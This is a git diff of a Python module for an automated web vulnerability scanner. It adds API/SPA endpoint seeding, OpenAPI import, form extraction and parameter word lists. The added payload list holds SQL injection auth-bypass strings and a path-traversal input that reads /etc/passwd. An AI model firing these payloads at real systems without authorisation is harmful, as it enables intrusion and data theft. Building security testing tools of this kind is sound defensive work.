@@ -10,67 +10,148 @@ Active web-application vulnerability testing that goes beyond recon:
 
 Every tool degrades gracefully if its binary is missing. All findings are
 written through the agent's add_finding() so they appear live in the UI and
-in the Saga report.
+in the Apollo report.
 """
 import asyncio
 import json
 import os
 import re
 import tempfile
-from html import unescape
-from urllib.parse import urljoin, urlparse, parse_qs, parse_qsl, urlencode, urlunparse
+from html.parser import HTMLParser
+from urllib.parse import urlparse, parse_qs, urljoin
 
-import httpx
-
-from core.web_security import (
-    HIGH_VALUE_EXPOSURE_PATHS,
-    analyze_idor_pair,
-    analyze_traversal_pair,
-    build_idor_probes,
-    build_traversal_probes,
-    generate_discovery_words,
-    is_url_in_scope,
-    normalize_discovered_url,
-)
-
+# Curated wordlists first (fast, fetched at build time), full SecLists as fallback.
 SECLISTS_DIRS = [
+    "/opt/wordlists/raft-medium-directories.txt",
+    "/opt/wordlists/common.txt",
     "/opt/seclists/Discovery/Web-Content/raft-medium-directories.txt",
-    "/opt/seclists/Discovery/Web-Content/raft-small-words.txt",
-    "/opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
     "/opt/seclists/Discovery/Web-Content/common.txt",
 ]
 
-PARAMETER_BRUTE_WORDS = (
-    "searchTerm", "search", "q", "query", "keyword", "term", "s", "text",
-    "id", "productId", "product_id", "itemId", "item_id", "sku", "category",
-    "cat", "sort", "order", "filter", "page", "p", "limit", "offset",
-    "stockApi", "stock_api", "stockId", "stock_id", "xml", "payload", "data",
-    "json", "redirect", "redirectUrl", "redirect_url", "redirectUri",
-    "redirect_uri", "returnUrl", "return_url", "return", "next", "continue",
-    "url", "uri", "dest", "destination", "file", "filename", "path", "folder",
-    "dir", "template", "view", "include", "pagePath", "download", "image",
-    "img", "lang", "locale", "callback", "jsonp", "message", "name", "email",
-    "username", "user", "userId", "user_id", "uid", "account", "accountId",
-    "account_id", "customer", "customerId", "customer_id", "admin", "role",
-    "debug", "test", "token", "api_key", "apikey", "key", "csrf",
-    "csrfToken", "session", "sessionId", "ref", "source", "from", "to",
-    "minPrice", "maxPrice", "price", "type", "format", "callbackUrl",
-    "logout", "login", "password", "oldPassword", "newPassword",
+# Max number of spider-discovered endpoints we import into ZAP's site tree per
+# host so the active scanner covers each URL/parameter katana found, not just the
+# root. Kept bounded so seeding does not dwarf the scan itself.
+MAX_ZAP_SEED = 200
+
+# Common API / SPA endpoints a JS crawler misses. Single-page apps (Angular/React,
+# e.g. OWASP Juice Shop) render routes client-side and keep the real attack surface
+# in a REST/GraphQL API that never appears in the page HTML. We probe these directly;
+# the parameterized ones give the injection probes actual parameters to attack.
+COMMON_ENDPOINTS = [
+    # API / SPA roots + docs
+    "/api", "/api/v1", "/api/v2", "/rest", "/graphql",
+    "/swagger.json", "/openapi.json", "/api-docs", "/v2/api-docs",
+    # Common REST resources
+    "/api/users", "/api/products", "/api/orders", "/rest/user/whoami",
+    "/rest/products/search?q=test",
+    # Generic parameterized probes (hand the fuzzers params on the app root)
+    "/?q=test", "/?s=test", "/?id=1", "/?search=test",
+    "/?file=test", "/?url=http://test", "/?redirect=/test", "/?page=1",
+]
+
+# Where OpenAPI / Swagger specs commonly live. A machine-readable spec is the
+# richest surface source there is — every path + parameter, no crawling.
+SPEC_PATHS = [
+    "/openapi.json", "/swagger.json", "/v2/api-docs", "/api-docs",
+    "/swagger/v1/swagger.json", "/api/swagger.json", "/api-docs/swagger.json",
+    "/openapi.yaml", "/api/openapi.json",
+]
+
+# Unlikely-to-collide reflection canary + the shared injection payload set used by
+# both the query-param auto-fuzz and the form (POST/body) probe.
+XSS_CANARY = "olymxss7z"
+INJECT_PAYLOADS = [
+    "'", '"', "')", "';",              # SQL / quote syntax breakers
+    "1' OR '1'='1", "' OR 1=1-- -",    # SQLi (incl. auth-bypass on login forms)
+    f"<{XSS_CANARY}>",                  # unencoded-reflection canary
+    "../../../../etc/passwd",          # path traversal
+]
+
+
+class _FormExtractor(HTMLParser):
+    """Pull <form> actions/methods and their input/textarea/select field names out
+    of an HTML page — the POST/body attack surface a URL crawler never sees."""
+
+    def __init__(self):
+        super().__init__()
+        self.forms = []
+        self._cur = None
+
+    def handle_starttag(self, tag, attrs):
+        a = dict(attrs)
+        if tag == "form":
+            self._cur = {"action": a.get("action") or "",
+                         "method": (a.get("method") or "get").lower(),
+                         "fields": []}
+        elif tag in ("input", "textarea", "select") and self._cur is not None:
+            name = a.get("name")
+            itype = (a.get("type") or "text").lower()
+            if name and itype not in ("submit", "button", "image", "reset", "file", "hidden"):
+                if name not in self._cur["fields"]:
+                    self._cur["fields"].append(name)
+
+    def handle_endtag(self, tag):
+        if tag == "form" and self._cur is not None:
+            self.forms.append(self._cur)
+            self._cur = None
+
+
+def _host_ok(candidate: str, base: str) -> bool:
+    """True when candidate is on the same host as base — keeps form testing in scope."""
+    try:
+        ch = urlparse(candidate).netloc.lower()
+        bh = urlparse(base).netloc.lower()
+        return bool(ch) and ch == bh
+    except Exception:
+        return False
+
+# Static assets to drop from archive parameter discovery: they rarely carry an
+# injectable parameter and would only dilute the test pool.
+ARCHIVE_SKIP_EXT = (
+    ".jpg", ".jpeg", ".png", ".gif", ".svg", ".ico", ".webp", ".bmp",
+    ".css", ".js", ".woff", ".woff2", ".ttf", ".eot", ".otf",
+    ".mp4", ".webm", ".mp3", ".pdf", ".zip", ".gz", ".tar", ".rar",
 )
+
+# Parameter names that commonly carry a redirect target (open-redirect probe).
+REDIRECT_PARAMS = {
+    "url", "next", "redirect", "redir", "return", "returnurl", "return_url",
+    "dest", "destination", "continue", "goto", "go", "r", "u", "link", "out",
+    "target", "redirect_uri", "callback", "checkout_url", "forward", "to",
+}
+
+# Parameter names that commonly carry a URL the server fetches (SSRF probe).
+SSRF_PARAMS = {
+    "url", "uri", "path", "dest", "destination", "redirect", "link", "src",
+    "source", "target", "host", "site", "domain", "callback", "feed", "file",
+    "page", "proxy", "fetch", "load", "image", "img", "open", "to", "out",
+    "view", "remote", "api", "endpoint", "data", "reference", "ref",
+}
+
+# High-signal candidate names for active parameter mining (arjun style).
+PARAM_MINE_CANDIDATES = [
+    "id", "page", "file", "dir", "path", "url", "redirect", "next", "q", "s",
+    "search", "query", "user", "username", "email", "debug", "test", "admin",
+    "cmd", "exec", "action", "view", "include", "template", "lang", "callback",
+    "return", "data", "key", "token", "format", "type", "mode", "step", "order",
+    "sort", "field", "filter", "start", "limit", "offset", "ref", "source",
+    "target", "dest", "preview", "download", "doc", "report", "print", "export",
+    "import", "name", "value", "content", "message", "comment", "title", "body",
+]
 
 
 class OffensiveEngine:
-    """Mixed into the active assessment agent. Expects the host to provide: self.run_command, self.log,
+    """Mixed into Ares. Expects the host to provide: self.run_command, self.log,
     self.add_finding (all from BaseAgent)."""
 
     # ── Crawl ────────────────────────────────────────────────────
     async def crawl(self, base_url: str, max_urls: int = 200) -> list:
         await self.log(f"Crawling {base_url} for endpoints and parameters (katana)", "info")
-        stdout, _, rc = await self.run_command(
-            ["katana", "-u", base_url, "-jc", "-kf", "all", "-d", "3",
-             "-c", "15", "-silent", "-nc", "-timeout", "10"],
-            timeout=180,
-        )
+        cmd = ["katana", "-u", base_url, "-jc", "-kf", "all", "-d", "3",
+               "-c", "15", "-silent", "-nc", "-timeout", "10"]
+        if self._cookie():
+            cmd += ["-H", f"Cookie: {self._cookie()}"]
+        stdout, _, rc = await self.run_command(cmd, timeout=180)
         if rc == 127:
             await self.log("katana not available; falling back to seed URL only", "warn")
             return [base_url]
@@ -86,879 +167,233 @@ class OffensiveEngine:
         await self.log(f"Crawl complete: {len(urls)} URLs, {len(param_urls)} with parameters", "success")
         return urls
 
-    def _attr_value(self, html: str, name: str) -> str:
-        match = re.search(rf'''\b{name}\s*=\s*["']?([^"'\s>]+)''', html, re.I)
-        return unescape(match.group(1).strip()) if match else ""
+    async def seed_endpoints(self, base_url: str) -> list:
+        """Probe a curated set of common API/SPA endpoints that JS crawlers miss.
 
-    def _looks_static_asset(self, url: str, *, allow_js: bool = True) -> bool:
-        path = urlparse(url).path.lower()
-        static_exts = (
-            ".png", ".jpg", ".jpeg", ".gif", ".svg", ".webp", ".ico",
-            ".js", ".css", ".woff", ".woff2", ".ttf", ".eot", ".mp4", ".webm",
-            ".pdf", ".zip", ".gz", ".tar", ".rar", ".7z",
-        )
-        if allow_js and path.endswith(".js"):
-            return False
-        return path.endswith(static_exts)
-
-    def _extract_html_routes(self, page_url: str, text: str) -> tuple[list[str], list[str]]:
-        urls: list[str] = []
-        form_candidates: list[str] = []
-
-        for match in re.findall(r'''(?:href|src|action)\s*=\s*["']([^"']+)["']''', text, re.I):
-            if match.startswith(("mailto:", "tel:", "javascript:", "data:")):
-                continue
-            urls.append(urljoin(page_url, unescape(match)))
-
-        # Pick up fetch('/api/x'), axios.get('/x'), url: '/x', and similar app routes inside HTML/JS.
-        js_route_re = re.compile(
-            r'''["']((?:https?://[^"'<>\s\\]+|/[A-Za-z0-9._~!$&'()*+,;=:@%/-][^"'<>\s\\]{0,220})(?:\?[^"'<>\s\\]*)?)["']''',
-            re.I,
-        )
-        for raw in js_route_re.findall(text[:500000]):
-            if raw.startswith(("/static/", "/assets/")):
-                continue
-            urls.append(urljoin(page_url, unescape(raw)))
-
-        form_re = re.compile(r"<form\b(?P<attrs>[^>]*)>(?P<body>.*?)</form>", re.I | re.S)
-        field_re = re.compile(r'''<(?:input|select|textarea)\b[^>]*\bname\s*=\s*["']?([^"'\s>]+)''', re.I)
-        for form in form_re.finditer(text[:500000]):
-            attrs = form.group("attrs") or ""
-            body = form.group("body") or ""
-            action = self._attr_value(attrs, "action") or page_url
-            names = []
-            seen_names = set()
-            for name in field_re.findall(body):
-                clean = unescape(name.strip())
-                if clean and clean not in seen_names:
-                    seen_names.add(clean)
-                    names.append(clean)
-            if not names:
-                continue
-            target = urljoin(page_url, action)
-            parsed = urlparse(target)
-            existing = parse_qsl(parsed.query, keep_blank_values=True)
-            existing_names = {k for k, _ in existing}
-            pairs = existing + [(name, "yggdrasil") for name in names if name not in existing_names]
-            form_candidates.append(urlunparse(parsed._replace(query=urlencode(pairs, doseq=True), fragment="")))
-
-        return urls, form_candidates
-
-    async def spider_http(
-        self,
-        base_url: str,
-        seeds: list,
-        scope_rules: dict | None = None,
-        max_pages: int = 80,
-        max_urls: int = 700,
-    ) -> list:
-        queue = self._dedupe_in_scope_urls([base_url] + (seeds or []), base_url, scope_rules, max_urls=max_urls)
-        seen_pages: set[str] = set()
-        discovered: list[str] = list(queue)
-        form_candidates: list[str] = []
-        fetched = 0
-
-        await self.log(f"Spider crawl starting with {len(queue)} seed URL(s)", "info")
-        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True) as c:
-            while queue and fetched < max_pages and len(discovered) < max_urls:
-                page = queue.pop(0)
-                page_key = page.split("#", 1)[0]
-                if page_key in seen_pages or self._looks_static_asset(page_key, allow_js=True):
-                    continue
-                seen_pages.add(page_key)
-                try:
-                    response = await c.get(page)
-                except Exception:
-                    continue
-                fetched += 1
-                content_type = response.headers.get("content-type", "").lower()
-                path = urlparse(str(response.url)).path.lower()
-                if response.status_code >= 500:
-                    continue
-                if "html" not in content_type and "javascript" not in content_type and not path.endswith(".js"):
-                    continue
-
-                extracted, forms = self._extract_html_routes(str(response.url), response.text)
-                form_candidates.extend(forms)
-                for candidate in extracted + forms:
-                    if self._looks_static_asset(candidate, allow_js=True) and "?" not in candidate:
-                        continue
-                    normalized = self._dedupe_in_scope_urls([candidate], base_url, scope_rules, max_urls=1)
-                    if not normalized:
-                        continue
-                    candidate = normalized[0]
-                    if candidate not in discovered:
-                        discovered.append(candidate)
-                        if not self._looks_static_asset(candidate, allow_js=True) and len(queue) < max_pages:
-                            queue.append(candidate)
-
-        parameterized = [u for u in discovered if "?" in u and "=" in u]
-        await self.log(
-            f"Spider crawl harvested {len(discovered)} URL(s), "
-            f"{len(parameterized)} parameterized, {len(form_candidates)} form-derived candidate(s)",
-            "success" if len(discovered) > 1 else "info",
-        )
-        return self._dedupe_in_scope_urls(discovered + form_candidates, base_url, scope_rules, max_urls=max_urls)
-
-    # ── SQL injection ────────────────────────────────────────────
-    def _extract_urls_from_text(self, text: str) -> list[str]:
-        urls = []
-        for match in re.findall(r'''https?://[^\s"'<>\\)]+''', text or ""):
-            urls.append(match.rstrip(".,;]})"))
-        return urls
-
-    async def paramspider_parameter_mining(
-        self,
-        base_url: str,
-        scope_rules: dict | None = None,
-        max_urls: int = 350,
-    ) -> list:
-        domain = urlparse(base_url).hostname or ""
-        if not domain:
-            return []
-
-        found: list[str] = []
-        stdout, stderr, rc = await self.run_command(
-            ["paramspider", "-d", domain, "-s"],
-            timeout=180,
-        )
-        if rc == 127:
-            await self.log("ParamSpider not available; using archive parameter mining fallback", "warn")
-        elif rc == 0:
-            found.extend(self._extract_urls_from_text(stdout))
-        else:
-            await self.log(f"ParamSpider returned non-zero status; using archive fallback ({stderr[:120]})", "warn")
-
+        SPAs (Juice Shop et al.) serve the same index for every route, so a crawl
+        finds ~nothing and the app looks clean. We hit the likely API/REST/GraphQL
+        paths directly and keep the ones that actually exist, always keeping the
+        parameterized probes so the injection tests have parameters to attack.
+        Additive to the crawl surface; degrades to [] on any error."""
+        import httpx
+        base = base_url.rstrip("/")
+        found = []
         try:
-            async with httpx.AsyncClient(timeout=15, verify=False, follow_redirects=True) as c:
-                response = await c.get(
-                    "https://web.archive.org/cdx",
-                    params={
-                        "url": f"{domain}/*",
-                        "output": "json",
-                        "fl": "original",
-                        "collapse": "urlkey",
-                        "filter": "statuscode:200",
-                    },
-                )
-            if response.status_code == 200:
-                data = response.json()
-                for row in data[1:900] if isinstance(data, list) else []:
-                    if isinstance(row, list) and row:
-                        found.append(str(row[0]))
+            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True,
+                                         headers=self._auth_headers()) as c:
+                try:
+                    root = await c.get(base + "/")
+                    root_len = len(root.content)
+                except Exception:
+                    root_len = -1
+
+                async def probe(path: str):
+                    url = base + path
+                    try:
+                        r = await c.get(url)
+                    except Exception:
+                        return None
+                    if r.status_code in (400, 404):
+                        return None
+                    # SPA catch-all: a non-parameterized path whose body matches the
+                    # root is just index.html — noise. Parameterized probes are always
+                    # kept (the fuzzers need the parameter).
+                    if "?" not in path and root_len >= 0 and abs(len(r.content) - root_len) < 32:
+                        return None
+                    return url
+
+                results = await asyncio.gather(*[probe(p) for p in COMMON_ENDPOINTS],
+                                               return_exceptions=True)
+            for r in results:
+                if isinstance(r, str) and r:
+                    found.append(r)
         except Exception as e:
-            await self.log(f"Archive parameter mining fallback failed: {type(e).__name__}", "warn")
-
-        param_urls = [u for u in found if "?" in u and "=" in u]
-        param_urls = self._dedupe_in_scope_urls(param_urls, base_url, scope_rules, max_urls=max_urls)
-        param_names = {
-            name
-            for url in param_urls
-            for name, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)
-            if name
-        }
-        await self.log(
-            f"ParamSpider-style mining found {len(param_urls)} parameterized URL(s), "
-            f"{len(param_names)} unique parameter name(s)",
-            "success" if param_urls else "info",
-        )
-        return param_urls
-
-    def _candidate_routes_for_parameter_discovery(
-        self,
-        base_url: str,
-        urls: list,
-        declared_paths: list | None = None,
-        scope_rules: dict | None = None,
-        max_routes: int = 12,
-    ) -> list[str]:
-        routes: list[str] = []
-
-        def add(raw: str):
-            if not raw or not isinstance(raw, str):
-                return
-            route = raw.split("#", 1)[0].strip()
-            if not route.startswith("http"):
-                route = urljoin(base_url.rstrip("/") + "/", route.lstrip("/"))
-            route = self._route_without_query(route)
-            if self._looks_static_asset(route, allow_js=False):
-                return
-            if not is_url_in_scope(route, base_url, scope_rules):
-                return
-            if route not in routes:
-                routes.append(route)
-
-        for raw in self._urls_from_declared_paths(base_url, declared_paths or []):
-            add(raw)
-        for raw in urls or []:
-            add(raw)
-        add(base_url)
-
-        def score(route: str) -> tuple[int, str]:
-            path = (urlparse(route).path or "/").lower()
-            value = 0
-            if self._declared_hints_for_route(path, declared_paths):
-                value -= 400
-            for marker, weight in (
-                ("/catalog/product/stock", -180),
-                ("/catalog/product", -160),
-                ("/catalog/subscribe", -150),
-                ("/catalog", -140),
-                ("/blog/post", -120),
-                ("/blog", -110),
-                ("/login", -100),
-                ("/my-account", -90),
-            ):
-                if marker in path:
-                    value += weight
-            if path in ("", "/"):
-                value += 150
-            return (value, route)
-
-        return sorted(routes, key=score)[:max_routes]
-
-    def _collect_parameter_names_from_json(self, obj, parent_key: str = "") -> set[str]:
-        names: set[str] = set()
-        param_keys = {"param", "params", "parameter", "parameters", "name", "names", "found"}
-        method_keys = {"get", "post", "put", "patch", "delete", "json", "xml", "headers", "cookies", "query", "body"}
-
-        if isinstance(obj, dict):
-            parent_is_param = parent_key.lower() in param_keys
-            for key, value in obj.items():
-                key_text = str(key)
-                if "url" in key_text.lower() and isinstance(value, str):
-                    for name, _ in parse_qsl(urlparse(value).query, keep_blank_values=True):
-                        clean = self._clean_parameter_name(name)
-                        if clean:
-                            names.add(clean)
-                if parent_is_param and key_text.lower() not in method_keys:
-                    clean = self._clean_parameter_name(key_text)
-                    if clean:
-                        names.add(clean)
-                if key_text.lower() in {"param", "parameter", "name"} and isinstance(value, str):
-                    clean = self._clean_parameter_name(value)
-                    if clean:
-                        names.add(clean)
-                names.update(self._collect_parameter_names_from_json(value, key_text))
-        elif isinstance(obj, list):
-            parent_is_param = parent_key.lower() in param_keys or parent_key.lower() in method_keys
-            for item in obj:
-                if parent_is_param and isinstance(item, str):
-                    clean = self._clean_parameter_name(item)
-                    if clean and not clean.startswith("http"):
-                        names.add(clean)
-                names.update(self._collect_parameter_names_from_json(item, parent_key))
-        return names
-
-    def _collect_parameter_names_from_text(self, text: str) -> set[str]:
-        names: set[str] = set()
-        for url in self._extract_urls_from_text(text or ""):
-            for name, _ in parse_qsl(urlparse(url).query, keep_blank_values=True):
-                clean = self._clean_parameter_name(name)
-                if clean:
-                    names.add(clean)
-
-        for line in (text or "").splitlines():
-            low = line.lower()
-            if "param" not in low and "found" not in low:
-                continue
-            if ":" in line:
-                line = line.split(":", 1)[1]
-            for token in re.split(r"[\s,\[\]{}'\"=]+", line):
-                clean = self._clean_parameter_name(token)
-                if 1 < len(clean) < 80 and not clean.lower().startswith(("http", "found", "param")):
-                    names.add(clean)
-        return names
-
-    def _parameter_urls_from_names(
-        self,
-        routes: list[str],
-        names: set[str],
-        base_url: str,
-        scope_rules: dict | None = None,
-        tool: str = "external",
-        max_urls: int = 180,
-    ) -> list[dict]:
-        found: list[dict] = []
-        seen = set()
-        for route in routes:
-            for name in sorted(names):
-                candidate = self._append_param_to_url(route, name)
-                if candidate in seen or not is_url_in_scope(candidate, base_url, scope_rules):
-                    continue
-                seen.add(candidate)
-                found.append({"url": candidate, "route": route, "parameter": name, "tool": tool})
-                if len(found) >= max_urls:
-                    return found
+            await self.log(f"Endpoint seeding skipped: {e}", "warn")
+            return []
+        if found:
+            await self.log(f"Seeded {len(found)} common API/SPA endpoint(s) crawlers miss", "info")
         return found
 
-    async def arjun_parameter_discovery(
-        self,
-        base_url: str,
-        urls: list,
-        scope_rules: dict | None = None,
-        declared_paths: list | None = None,
-        max_routes: int = 10,
-    ) -> list[dict]:
-        routes = self._candidate_routes_for_parameter_discovery(
-            base_url, urls, declared_paths, scope_rules, max_routes=max_routes
-        )
-        if not routes:
-            return []
+    async def import_api_specs(self, base_url: str) -> list:
+        """Discover an OpenAPI/Swagger spec and fold its endpoints into the surface.
 
-        await self.log(f"Arjun parameter discovery on {len(routes)} high-value route(s)", "info")
-        target_file = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
-        output_file = tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False)
-        target_file.write("\n".join(routes))
-        target_file.close()
-        output_file.close()
-
-        names: set[str] = set()
+        A machine-readable spec hands us every path + parameter with zero crawling —
+        the single best surface source for API targets. Scope-safe (endpoints are
+        anchored to the target host); degrades to [] when no spec is exposed."""
+        from core.surface import endpoints_from_openapi
+        import httpx
+        base = base_url.rstrip("/")
         try:
-            stdout, stderr, rc = await self.run_command(
-                [
-                    "arjun", "-i", target_file.name, "-o", output_file.name,
-                    "-m", "GET", "-t", "5", "-T", "10", "--stable", "-q",
-                ],
-                timeout=240,
-            )
-            if rc == 127:
-                await self.log("Arjun not available; skipping Arjun parameter discovery", "warn")
-                return []
-            if rc != 0:
-                await self.log(f"Arjun returned non-zero status: {(stderr or stdout)[:180]}", "warn")
-            if os.path.exists(output_file.name) and os.path.getsize(output_file.name) > 0:
-                try:
-                    with open(output_file.name, "r", encoding="utf-8", errors="ignore") as fh:
-                        names.update(self._collect_parameter_names_from_json(json.load(fh)))
-                except Exception:
-                    with open(output_file.name, "r", encoding="utf-8", errors="ignore") as fh:
-                        names.update(self._collect_parameter_names_from_text(fh.read()))
-            names.update(self._collect_parameter_names_from_text(stdout))
-        finally:
-            for path in (target_file.name, output_file.name):
-                try:
-                    os.unlink(path)
-                except OSError:
-                    pass
-
-        results = self._parameter_urls_from_names(routes, names, base_url, scope_rules, tool="arjun")
-        await self.log(
-            f"Arjun discovered {len(names)} parameter name(s), producing {len(results)} URL candidate(s)",
-            "success" if results else "info",
-        )
-        return results
-
-    async def x8_parameter_discovery(
-        self,
-        base_url: str,
-        urls: list,
-        scope_rules: dict | None = None,
-        declared_paths: list | None = None,
-        max_routes: int = 8,
-    ) -> list[dict]:
-        routes = self._candidate_routes_for_parameter_discovery(
-            base_url, urls, declared_paths, scope_rules, max_routes=max_routes
-        )
-        if not routes:
-            return []
-
-        names = self._candidate_parameter_names(urls, declared_paths, limit=180)
-        wordlist_file = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
-        output_file = tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False)
-        wordlist_file.write("\n".join(names))
-        wordlist_file.close()
-        output_file.close()
-
-        discovered_names: set[str] = set()
-        await self.log(f"x8 hidden parameter discovery on {len(routes)} route(s) with {len(names)} names", "info")
-        try:
-            stdout, stderr, rc = await self.run_command(
-                [
-                    "x8", "-u", *routes, "-w", wordlist_file.name, "-O", "json",
-                    "-o", output_file.name, "--timeout", "10", "-W", "4",
-                    "--strict", "--remove-empty",
-                ],
-                timeout=240,
-            )
-            if rc == 127:
-                await self.log("x8 not available; native wfuzz-style parameter probing remains enabled", "warn")
-                return []
-            if rc != 0:
-                await self.log(f"x8 returned non-zero status: {(stderr or stdout)[:180]}", "warn")
-            if os.path.exists(output_file.name) and os.path.getsize(output_file.name) > 0:
-                with open(output_file.name, "r", encoding="utf-8", errors="ignore") as fh:
-                    text = fh.read()
-                try:
-                    discovered_names.update(self._collect_parameter_names_from_json(json.loads(text)))
-                except Exception:
-                    discovered_names.update(self._collect_parameter_names_from_text(text))
-            discovered_names.update(self._collect_parameter_names_from_text(stdout))
-        finally:
-            for path in (wordlist_file.name, output_file.name):
-                try:
-                    os.unlink(path)
-                except OSError:
-                    pass
-
-        results = self._parameter_urls_from_names(routes, discovered_names, base_url, scope_rules, tool="x8")
-        await self.log(
-            f"x8 discovered {len(discovered_names)} parameter name(s), producing {len(results)} URL candidate(s)",
-            "success" if results else "info",
-        )
-        return results
-
-    async def external_parameter_discovery(
-        self,
-        base_url: str,
-        urls: list,
-        scope_rules: dict | None = None,
-        declared_paths: list | None = None,
-    ) -> list[dict]:
-        results: list[dict] = []
-        for tool_name, coro in (
-            ("Arjun", self.arjun_parameter_discovery(base_url, urls, scope_rules, declared_paths)),
-            ("x8", self.x8_parameter_discovery(base_url, urls, scope_rules, declared_paths)),
-        ):
-            try:
-                tool_results = await coro
-                results.extend(tool_results if isinstance(tool_results, list) else [])
-            except Exception as e:
-                await self.log(f"{tool_name} parameter discovery failed: {type(e).__name__}: {str(e)[:180]}", "warn")
-
-        deduped: list[dict] = []
-        seen = set()
-        for row in results:
-            url = row.get("url") if isinstance(row, dict) else ""
-            if not url or url in seen:
-                continue
-            seen.add(url)
-            deduped.append(row)
-        return deduped[:240]
-
-    def _candidate_parameter_names(self, urls: list, declared_paths: list | None = None, limit: int = 90) -> list[str]:
-        priority_word_count = 55
-        names = list(PARAMETER_BRUTE_WORDS[:priority_word_count])
-        for raw in urls or []:
-            parsed = urlparse(raw)
-            for name, _ in parse_qsl(parsed.query, keep_blank_values=True):
-                if name:
-                    names.append(name)
-            for part in parsed.path.split("/"):
-                part = re.sub(r"[^A-Za-z0-9_]", "", part)
-                if 2 < len(part) < 35:
-                    names.append(part)
-                    names.append(part + "_id")
-        for row in declared_paths or []:
-            if not isinstance(row, dict):
-                continue
-            path = str(row.get("path") or "")
-            for part in path.split("/"):
-                part = re.sub(r"[^A-Za-z0-9_]", "", part)
-                if 2 < len(part) < 35:
-                    names.append(part)
-                    names.append(part + "_id")
-            for hint in row.get("hints", []) or []:
-                low = str(hint).lower()
-                if "redirect" in low:
-                    names.extend(["redirect", "url", "next", "returnUrl"])
-                if "xml" in low or "xxe" in low:
-                    names.extend(["xml", "data", "payload", "stockApi"])
-                if "sql" in low:
-                    names.extend(["id", "category", "product_id", "search"])
-                if "xss" in low or "cross-site" in low:
-                    names.extend(["q", "search", "message", "name", "callback"])
-        names.extend(PARAMETER_BRUTE_WORDS[priority_word_count:])
-        deduped = []
-        seen = set()
-        for name in names:
-            clean = self._clean_parameter_name(name)
-            if not clean or clean in seen:
-                continue
-            seen.add(clean)
-            deduped.append(clean)
-            if len(deduped) >= limit:
-                break
-        return deduped
-
-    def _clean_parameter_name(self, name: str) -> str:
-        return re.sub(r"[^A-Za-z0-9_.-]", "", str(name).strip())[:80]
-
-    def _declared_hints_for_route(self, route_path: str, declared_paths: list | None = None) -> list[str]:
-        route_path = (route_path or "/").split("?", 1)[0].strip() or "/"
-        if not route_path.startswith("/"):
-            route_path = "/" + route_path
-        route_norm = route_path.rstrip("/") or "/"
-
-        hints: list[str] = []
-        for row in declared_paths or []:
-            if not isinstance(row, dict):
-                continue
-            declared = str(row.get("path") or "").split("?", 1)[0].strip()
-            if not declared.startswith("/"):
-                continue
-            declared_norm = declared.rstrip("/") or "/"
-            exact = route_norm == declared_norm
-            child = declared_norm != "/" and route_norm.startswith(declared_norm + "/")
-            if not exact and not child:
-                continue
-            hints.extend(str(h) for h in (row.get("hints") or []) if h)
-        return hints
-
-    def _append_param_to_url(self, route: str, name: str, value: str = "yggdrasil") -> str:
-        parsed = urlparse(route)
-        pairs = parse_qsl(parsed.query, keep_blank_values=True)
-        if any(k == name for k, _ in pairs):
-            pairs = [(k, value if k == name else v) for k, v in pairs]
-        else:
-            pairs.append((name, value))
-        return urlunparse(parsed._replace(query=urlencode(pairs, doseq=True), fragment=""))
-
-    def _route_parameter_names(self, route: str, urls: list, declared_paths: list | None = None) -> list[str]:
-        parsed = urlparse(route)
-        path = parsed.path or "/"
-        path_lower = path.lower()
-        segments = [s for s in re.split(r"[^A-Za-z0-9]+", path) if 1 < len(s) < 35]
-        hints = self._declared_hints_for_route(path, declared_paths)
-        names: list[str] = []
-
-        def add(*items):
-            for item in items:
-                if isinstance(item, (list, tuple, set)):
-                    add(*item)
-                else:
-                    clean = self._clean_parameter_name(item)
-                    if clean:
-                        names.append(clean)
-
-        # Keep observed parameters for the same route at the front.
-        route_key = self._route_without_query(route)
-        for raw in urls or []:
-            if self._route_without_query(raw) != route_key:
-                continue
-            for name, _ in parse_qsl(urlparse(raw).query, keep_blank_values=True):
-                add(name)
-
-        if "/catalog/product/stock" in path_lower:
-            add("stockApi", "stock_api", "productId", "product_id", "sku", "xml", "payload", "data", "url", "path")
-        if "/catalog/product" in path_lower:
-            add("productId", "product_id", "id", "sku", "itemId", "item_id")
-        if "/catalog/subscribe" in path_lower or "subscribe" in segments:
-            add("email", "name", "message", "callback", "redirect", "returnUrl")
-        if "/catalog" in path_lower:
-            add("searchTerm", "search", "q", "query", "category", "sort", "filter", "productId", "id", "minPrice", "maxPrice")
-        if "/blog" in path_lower:
-            add("id", "postId", "post_id", "search", "q", "query", "redirect", "url", "next")
-        if "/login" in path_lower or "account" in segments:
-            add("username", "email", "password", "redirect", "returnUrl", "next", "csrf", "token")
-
-        for segment in segments:
-            add(segment, f"{segment}Id", f"{segment}_id")
-
-        for hint in hints:
-            low = str(hint).lower()
-            if "sql" in low:
-                add("id", "searchTerm", "search", "category", "productId", "product_id", "sort", "filter")
-            if "xss" in low or "cross-site" in low or "template injection" in low or "dom" in low:
-                add("searchTerm", "q", "query", "message", "name", "callback", "returnUrl", "redirect", "data")
-            if "xml" in low or "xxe" in low:
-                add("xml", "payload", "data", "stockApi", "stock_api", "url", "path")
-            if "redirect" in low or "link manipulation" in low or "request url" in low:
-                add("redirect", "redirectUrl", "redirect_uri", "url", "next", "returnUrl", "continue")
-            if "traversal" in low or "file" in low or "lfi" in low or "include" in low:
-                add("file", "filename", "path", "template", "include", "download")
-            if "base64" in low:
-                add("data", "payload", "id", "searchTerm")
-            if "header injection" in low:
-                add("redirect", "url", "next", "returnUrl", "callback")
-
-        add(self._candidate_parameter_names(urls, declared_paths, limit=160))
-
-        deduped: list[str] = []
-        seen = set()
-        for name in names:
-            if name in seen:
-                continue
-            seen.add(name)
-            deduped.append(name)
-        return deduped
-
-    def generate_parameter_test_urls(
-        self,
-        base_url: str,
-        urls: list,
-        declared_paths: list | None = None,
-        scope_rules: dict | None = None,
-        max_routes: int = 80,
-        max_urls: int = 450,
-    ) -> list[str]:
-        route_entries: list[tuple[str, int]] = []
-        seen_routes = set()
-
-        def add_route(raw: str):
-            if not raw or not isinstance(raw, str):
-                return
-            route = raw.split("#", 1)[0].strip()
-            if not route:
-                return
-            if not route.startswith("http"):
-                route = urljoin(base_url.rstrip("/") + "/", route.lstrip("/"))
-            route = self._route_without_query(route)
